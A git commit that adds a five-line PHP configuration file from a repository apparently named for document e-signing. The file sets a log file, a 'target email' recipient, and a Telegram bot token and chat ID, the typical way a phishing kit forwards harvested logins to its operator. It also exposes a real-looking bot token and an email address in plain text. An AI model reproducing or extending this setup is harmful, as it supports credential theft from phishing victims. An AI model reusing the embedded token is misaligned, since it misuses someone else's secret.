7cd6df1a6fdd1728eeb3effe0123e4d3a99dbf38
doc-e-sign3322740y <chrisfaust@studio210.com>
2026-06-23 16:14:40 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,5 @@
+<?php
+$logFile = "logs.txt";
+$emailTo = "sfg042@gmail.com"; // Replace with your target email
+$teltok = "8205116373:AAHuTd5LYKvQLe4UjYVI4Eu3EHUs6Fly9AM";
+$telchatid = "7118649900";
